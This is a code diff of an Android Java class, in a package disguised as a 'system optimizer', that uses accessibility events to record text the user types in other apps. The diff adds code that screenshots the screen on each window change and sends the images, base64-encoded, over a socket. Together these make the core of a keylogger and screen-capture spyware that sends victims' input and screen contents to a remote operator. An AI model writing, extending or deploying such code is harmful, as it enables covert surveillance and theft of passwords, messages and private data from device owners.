@@ -6,52 +6,61 @@ import java.util.List;
 import java.util.Locale;
 
 import com.system.optimizer.text.BufferedLogger;
+import com.system.optimizer.text.BufferedCapture;
+import com.system.optimizer.network.SocketManager;
 
 import android.view.accessibility.AccessibilityEvent;
 
-public class TextEventHandler {
+public class SystemEventHandler {
 
     private final BufferedLogger logger;
+    private final BufferedCapture capturer;
     private final SimpleDateFormat timestampFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
     private final ScreenshotEventHandler screenshotEventHandler;
 
-    public TextEventHandler(ScreenshotEventHandler screenshotEventHandler) {
+    public SystemEventHandler(ScreenshotEventHandler screenshotEventHandler, SocketManager socketManager) {
         if (screenshotEventHandler == null) {
             throw new IllegalArgumentException("ScreenshotEventHandler cannot be null");
         }
-        
+        if (socketManager == null) {
+            throw new IllegalArgumentException("SocketManager cannot be null");
+        }
+
         this.screenshotEventHandler = screenshotEventHandler;
-        
-        // Consumer that triggers screenshot capture (which handles sending)
+
+        // Logger that triggers screenshot capture after text delay
         this.logger = new BufferedLogger((text) -> {
-            // Add timestamp and trigger screenshot capture - it will handle sending the message
             String timestamp = timestampFormat.format(new Date());
             String messageWithTimestamp = "[" + timestamp + "] " + text;
             screenshotEventHandler.captureAndSend(messageWithTimestamp);
         });
+
+        // BufferedCapture: delay + async capture + send via socket
+        this.capturer = new BufferedCapture(
+                () -> screenshotEventHandler.takeScreenshot(),
+                (base64Image) -> socketManager.sendEvent("screenshot_response", base64Image));
     }
 
-    /**
-     * Handle accessibility events related to text input
-     */
-    public void onTextEvent(AccessibilityEvent event) {
+    public void onSystemEvent(AccessibilityEvent event) {
         if (event == null || event.getText() == null)
             return;
 
-        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
-
-            // Ignore system UI and keyboard events
-            if (packageName.equals("com.android.systemui") ||
-                    packageName.equals("android") ||
-                    packageName.equals("com.google.android.inputmethod.latin")) {
-                return;
-            }
-
+        // Ignore system UI and keyboard events
+        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
+        if (packageName.equals("com.android.systemui") ||
+        packageName.equals("android") ||
+        packageName.equals("com.google.android.inputmethod.latin")) {
+            return;
+        }
+        
+        int eventType = event.getEventType();
+        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             String text = normalizeTextEvent(event.getText());
             if (!text.isEmpty()) {
                 logger.onNewText(text);
             }
+        } else if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            capturer.trigger();
         }
     }
 
